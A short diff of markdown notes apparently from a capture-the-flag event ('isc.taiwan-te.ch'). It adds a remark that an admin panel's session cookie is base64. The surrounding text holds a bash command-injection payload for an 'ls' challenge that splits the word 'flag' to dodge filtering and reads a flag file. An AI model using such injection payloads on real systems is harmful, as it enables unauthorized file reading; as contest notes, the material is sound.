@@ -1,4 +1,8 @@
 # isc.taiwan-te.ch
+
+## admin-panel
+  `my_session` is base64  
+
 ## ls
 ```bash
 $(echo > /tmp/$(tail /$(echo fl)$(echo ag)); echo /tmp)
